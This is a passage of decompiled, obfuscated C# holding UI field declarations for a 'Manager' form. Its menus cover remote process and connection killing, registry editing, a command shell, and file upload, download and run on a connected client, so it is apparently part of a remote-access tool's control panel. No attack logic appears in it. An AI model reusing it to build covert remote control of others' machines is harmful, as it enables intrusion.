		private void \u0002(object \u0002, TreeNodeMouseClickEventArgs \u0003)
		{
			if (\u0003.Button != MouseButtons.Left)
			{
				return;
			}
			if (\u0003.Node.IsExpanded)
			{
				\u0003.Node.Collapse();
			}
			else
			{
				\u0003.Node.Expand();
			}
		}

		// Token: 0x0600032C RID: 812 RVA: 0x00024548 File Offset: 0x00022748
		private void \u0005\u2005(object \u0002, EventArgs \u0003)
		{
		}

		// Token: 0x0400017C RID: 380
		[AccessedThroughProperty("LPR")]
		private \u000F\u2000 \u0003;

		// Token: 0x0400017D RID: 381
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader \u0005;

		// Token: 0x0400017E RID: 382
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader \u0008;

		// Token: 0x0400017F RID: 383
		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader \u0006;

		// Token: 0x04000180 RID: 384
		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader \u000E;

		// Token: 0x04000181 RID: 385
		[AccessedThroughProperty("ColumnHeader6")]
		private ColumnHeader \u000F;

		// Token: 0x04000182 RID: 386
		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip \u0002\u2000;

		// Token: 0x04000183 RID: 387
		[AccessedThroughProperty("SL")]
		private ToolStripStatusLabel \u0003\u2000;

		// Token: 0x04000184 RID: 388
		[AccessedThroughProperty("pr")]
		private ToolStripProgressBar \u0005\u2000;

		// Token: 0x04000185 RID: 389
		[AccessedThroughProperty("M1")]
		private ContextMenuStrip \u0008\u2000;

		// Token: 0x04000186 RID: 390
		[AccessedThroughProperty("KillToolStripMenuItem")]
		private ToolStripMenuItem \u0006\u2000;

		// Token: 0x04000187 RID: 391
		[AccessedThroughProperty("KillDeleteToolStripMenuItem")]
		private ToolStripMenuItem \u000E\u2000;

		// Token: 0x04000188 RID: 392
		[AccessedThroughProperty("RestartToolStripMenuItem")]
		private ToolStripMenuItem \u000F\u2000;

		// Token: 0x04000189 RID: 393
		[AccessedThroughProperty("Timer1")]
		private Timer \u0002\u2001;

		// Token: 0x0400018A RID: 394
		[AccessedThroughProperty("ListView1")]
		private ListView \u0003\u2001;

		// Token: 0x0400018B RID: 395
		[AccessedThroughProperty("LTCP")]
		private \u000F\u2000 \u0005\u2001;

		// Token: 0x0400018C RID: 396
		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader \u0008\u2001;

		// Token: 0x0400018D RID: 397
		[AccessedThroughProperty("ColumnHeader7")]
		private ColumnHeader \u0006\u2001;

		// Token: 0x0400018E RID: 398
		[AccessedThroughProperty("ColumnHeader8")]
		private ColumnHeader \u000E\u2001;

		// Token: 0x0400018F RID: 399
		[AccessedThroughProperty("ColumnHeader9")]
		private ColumnHeader \u000F\u2001;

		// Token: 0x04000190 RID: 400
		[AccessedThroughProperty("ColumnHeader10")]
		private ColumnHeader \u0002\u2002;

		// Token: 0x04000191 RID: 401
		[AccessedThroughProperty("ColumnHeader11")]
		private ColumnHeader \u0003\u2002;

		// Token: 0x04000192 RID: 402
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip \u0005\u2002;

		// Token: 0x04000193 RID: 403
		[AccessedThroughProperty("KillConnectionToolStripMenuItem")]
		private ToolStripMenuItem \u0008\u2002;

		// Token: 0x04000194 RID: 404
		[AccessedThroughProperty("RG")]
		private Panel \u0006\u2002;

		// Token: 0x04000195 RID: 405
		[AccessedThroughProperty("ColumnHeader12")]
		private ColumnHeader \u000E\u2002;

		// Token: 0x04000196 RID: 406
		[AccessedThroughProperty("ColumnHeader13")]
		private ColumnHeader \u000F\u2002;

		// Token: 0x04000197 RID: 407
		[AccessedThroughProperty("ColumnHeader14")]
		private ColumnHeader \u0002\u2003;

		// Token: 0x04000198 RID: 408
		[AccessedThroughProperty("RGk")]
		private TreeView \u0003\u2003;

		// Token: 0x04000199 RID: 409
		[AccessedThroughProperty("crg")]
		private ContextMenuStrip \u0005\u2003;

		// Token: 0x0400019A RID: 410
		[AccessedThroughProperty("RefreshToolStripMenuItem2")]
		private ToolStripMenuItem \u0008\u2003;

		// Token: 0x0400019B RID: 411
		[AccessedThroughProperty("EditToolStripMenuItem")]
		private ToolStripMenuItem \u0006\u2003;

		// Token: 0x0400019C RID: 412
		[AccessedThroughProperty("NewValueToolStripMenuItem")]
		private ToolStripMenuItem \u000E\u2003;

		// Token: 0x0400019D RID: 413
		[AccessedThroughProperty("DeleteToolStripMenuItem1")]
		private ToolStripMenuItem \u000F\u2003;

		// Token: 0x0400019E RID: 414
		[AccessedThroughProperty("rimg")]
		private ImageList \u0002\u2004;

		// Token: 0x0400019F RID: 415
		[AccessedThroughProperty("crgk")]
		private ContextMenuStrip \u0003\u2004;

		// Token: 0x040001A0 RID: 416
		[AccessedThroughProperty("RefreshToolStripMenuItem3")]
		private ToolStripMenuItem \u0005\u2004;

		// Token: 0x040001A1 RID: 417
		[AccessedThroughProperty("CreateKeyToolStripMenuItem")]
		private ToolStripMenuItem \u0008\u2004;

		// Token: 0x040001A2 RID: 418
		[AccessedThroughProperty("DeleteKeyToolStripMenuItem")]
		private ToolStripMenuItem \u0006\u2004;

		// Token: 0x040001A3 RID: 419
		[AccessedThroughProperty("sh")]
		private Panel \u000E\u2004;

		// Token: 0x040001A4 RID: 420
		[AccessedThroughProperty("T1")]
		private RichTextBox \u000F\u2004;

		// Token: 0x040001A5 RID: 421
		[AccessedThroughProperty("T2")]
		private TextBox \u0002\u2005;

		// Token: 0x040001A6 RID: 422
		[AccessedThroughProperty("FMM")]
		private Panel \u0003\u2005;

		// Token: 0x040001A7 RID: 423
		[AccessedThroughProperty("L2")]
		private \u000F\u2000 \u0005\u2005;

		// Token: 0x040001A8 RID: 424
		[AccessedThroughProperty("ColumnHeader15")]
		private ColumnHeader \u0008\u2005;

		// Token: 0x040001A9 RID: 425
		[AccessedThroughProperty("ColumnHeader16")]
		private ColumnHeader \u0006\u2005;

		// Token: 0x040001AA RID: 426
		[AccessedThroughProperty("ColumnHeader17")]
		private ColumnHeader \u000E\u2005;

		// Token: 0x040001AB RID: 427
		[AccessedThroughProperty("P")]
		private PictureBox \u000F\u2005;

		// Token: 0x040001AC RID: 428
		[AccessedThroughProperty("TextBox1")]
		private TextBox \u0002\u2006;

		// Token: 0x040001AD RID: 429
		[AccessedThroughProperty("L1")]
		private \u000F\u2000 \u0003\u2006;

		// Token: 0x040001AE RID: 430
		[AccessedThroughProperty("ColumnHeader18")]
		private ColumnHeader \u0005\u2006;

		// Token: 0x040001AF RID: 431
		[AccessedThroughProperty("ColumnHeader19")]
		private ColumnHeader \u0008\u2006;

		// Token: 0x040001B0 RID: 432
		[AccessedThroughProperty("ContextMenuStrip3")]
		private ContextMenuStrip \u0006\u2006;

		// Token: 0x040001B1 RID: 433
		[AccessedThroughProperty("RefreshToolStripMenuItem")]
		private ToolStripMenuItem \u000E\u2006;

		// Token: 0x040001B2 RID: 434
		[AccessedThroughProperty("MG2")]
		private ImageList \u000F\u2006;

		// Token: 0x040001B3 RID: 435
		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip \u0002\u2007;

		// Token: 0x040001B4 RID: 436
		[AccessedThroughProperty("UPToolStripMenuItem")]
		private ToolStripMenuItem \u0003\u2007;

		// Token: 0x040001B5 RID: 437
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem \u0005\u2007;

		// Token: 0x040001B6 RID: 438
		[AccessedThroughProperty("RunToolStripMenuItem")]
		private ToolStripMenuItem \u0008\u2007;

		// Token: 0x040001B7 RID: 439
		[AccessedThroughProperty("DeleteToolStripMenuItem")]
		private ToolStripMenuItem \u0006\u2007;

		// Token: 0x040001B8 RID: 440
		[AccessedThroughProperty("ToolStripMenuItem2")]
		private ToolStripMenuItem \u000E\u2007;

		// Token: 0x040001B9 RID: 441
		[AccessedThroughProperty("RenameToolStripMenuItem")]
		private ToolStripMenuItem \u000F\u2007;

		// Token: 0x040001BA RID: 442
		[AccessedThroughProperty("CopyToolStripMenuItem")]
		private ToolStripMenuItem \u0002\u2008;

		// Token: 0x040001BB RID: 443
		[AccessedThroughProperty("CutToolStripMenuItem")]
		private ToolStripMenuItem \u0003\u2008;

		// Token: 0x040001BC RID: 444
		[AccessedThroughProperty("PasteToolStripMenuItem")]
		private ToolStripMenuItem \u0005\u2008;

		// Token: 0x040001BD RID: 445
		[AccessedThroughProperty("DownloadToolStripMenuItem")]
		private ToolStripMenuItem \u0008\u2008;

		// Token: 0x040001BE RID: 446
		[AccessedThroughProperty("UploadToolStripMenuItem")]
		private ToolStripMenuItem \u0006\u2008;

		// Token: 0x040001BF RID: 447
		[AccessedThroughProperty("NewEmptyFileToolStripMenuItem")]
		private ToolStripMenuItem \u000E\u2008;

		// Token: 0x040001C0 RID: 448
		[AccessedThroughProperty("NewFolderToolStripMenuItem")]
		private ToolStripMenuItem \u000F\u2008;

		// Token: 0x040001C1 RID: 449
		[AccessedThroughProperty("OpenFolderToolStripMenuItem")]
		private ToolStripMenuItem \u0002\u2009;

		// Token: 0x040001C2 RID: 450
		[AccessedThroughProperty("RarToolStripMenuItem")]
		private ToolStripMenuItem \u0003\u2009;

		// Token: 0x040001C3 RID: 451
		[AccessedThroughProperty("UnRarToolStripMenuItem")]
		private ToolStripMenuItem \u0005\u2009;

		// Token: 0x040001C4 RID: 452
		[AccessedThroughProperty("UploadFromLinkToolStripMenuItem")]
		private ToolStripMenuItem \u0008\u2009;

		// Token: 0x040001C5 RID: 453
		[AccessedThroughProperty("MG")]
		private ImageList \u0006\u2009;

		// Token: 0x040001C6 RID: 454
		[AccessedThroughProperty("ImageList1")]
		private ImageList \u000E\u2009;

		// Token: 0x040001C7 RID: 455
		[AccessedThroughProperty("LSRV")]
		private \u000F\u2000 \u000F\u2009;

		// Token: 0x040001C8 RID: 456
		[AccessedThroughProperty("ColumnHeader26")]
		private ColumnHeader \u0002\u200A;

		// Token: 0x040001C9 RID: 457
		[AccessedThroughProperty("ColumnHeader27")]
		private ColumnHeader \u0003\u200A;

		// Token: 0x040001CA RID: 458
		[AccessedThroughProperty("ColumnHeader28")]
		private ColumnHeader \u0005\u200A;

		// Token: 0x040001CB RID: 459
		[AccessedThroughProperty("ColumnHeader29")]
		private ColumnHeader \u0008\u200A;

		// Token: 0x040001CC RID: 460
		[AccessedThroughProperty("ColumnHeader30")]
		private ColumnHeader \u0006\u200A;

		// Token: 0x040001CD RID: 461
		[AccessedThroughProperty("ContextMenuStrip4")]
		private ContextMenuStrip \u000E\u200A;

		// Token: 0x040001CE RID: 462
		[AccessedThroughProperty("ToolStripMenuItem3")]
		private ToolStripMenuItem \u000F\u200A;

		// Token: 0x040001CF RID: 463
		[AccessedThroughProperty("ToolStripMenuItem4")]
		private ToolStripMenuItem \u0002\u200B;

		// Token: 0x040001D0 RID: 464
		[AccessedThroughProperty("ToolStripMenuItem5")]
		private ToolStripMenuItem \u0003\u200B;

		// Token: 0x040001D1 RID: 465
		[AccessedThroughProperty("RGLIST")]
		private \u000F\u2000 \u0005\u200B;

		// Token: 0x040001D2 RID: 466
		[AccessedThroughProperty("ColumnHeader20")]
		private ColumnHeader \u0008\u200B;

		// Token: 0x040001D3 RID: 467
		[AccessedThroughProperty("ColumnHeader21")]
		private ColumnHeader \u0006\u200B;

		// Token: 0x040001D4 RID: 468
		[AccessedThroughProperty("ColumnHeader22")]
		private ColumnHeader \u000E\u200B;

		// Token: 0x040001D5 RID: 469
		public Client sk;

		// Token: 0x040001D6 RID: 470
		public Collection RGCH;

		// Token: 0x040001D7 RID: 471
		private string \u000F\u200B;

		// Token: 0x040001D8 RID: 472
		public Collection Images;

		// Token: 0x040001D9 RID: 473
		public Collection Cache;

		// Token: 0x040001DA RID: 474
		public bool isCut;

		// Token: 0x040001DB RID: 475
		public string Flist;

		// Token: 0x040001DC RID: 476
		public bool TCPFX;

		// Token: 0x040001DD RID: 477
		public bool PRFX;

		// Token: 0x040001DE RID: 478
		public bool SrvFX;

		// Token: 0x040001DF RID: 479
		public bool srvNxt;

		// Token: 0x040001E0 RID: 480
		public int PID;

		// Token: 0x040001E1 RID: 481
		public bool PRNXT;

		// Token: 0x040001E2 RID: 482
		public bool TCPNXT;

		// Token: 0x040001E3 RID: 483
		private string[] \u0002\u2000\u2000;

		// Token: 0x040001E4 RID: 484
		private int \u0003\u2000\u2000;

		// Token: 0x040001E5 RID: 485
		private int \u0005\u2000\u2000;

		// Token: 0x040001E6 RID: 486
		public Manager.CR cur;

		// Token: 0x040001E7 RID: 487
		public int shStarted;

		// Token: 0x0200003D RID: 61
		public sealed class \u0002
		{
			// Token: 0x0600032D RID: 813 RVA: 0x0002454C File Offset: 0x0002274C
			public \u0002()
			{
				this.\u0003 = new List<string[]>();
				this.\u0005 = new List<string>();
			}

			// Token: 0x040001E8 RID: 488
			public string \u0002;

			// Token: 0x040001E9 RID: 489
			public List<string[]> \u0003;

			// Token: 0x040001EA RID: 490
			public List<string> \u0005;
		}

		// Token: 0x0200003E RID: 62
		public sealed class \u0003
		{
			// Token: 0x0600032E RID: 814 RVA: 0x0002456C File Offset: 0x0002276C
			public \u0003()
			{
				this.\u0003 = new List<string>();
				this.\u0005 = new List<string>();
			}

			// Token: 0x040001EB RID: 491
			public string \u0002;

			// Token: 0x040001EC RID: 492
			public List<string> \u0003;

			// Token: 0x040001ED RID: 493
			public List<string> \u0005;
		}

		// Token: 0x0200003F RID: 63
		public enum CR
		{
			// Token: 0x040001EF RID: 495
			PR = 1,
			// Token: 0x040001F0 RID: 496
			tcp,
			// Token: 0x040001F1 RID: 497
			reg,
			// Token: 0x040001F2 RID: 498
			shl,
			// Token: 0x040001F3 RID: 499
			fm = 0,
			// Token: 0x040001F4 RID: 500
			srv = 5
		}
	}
}
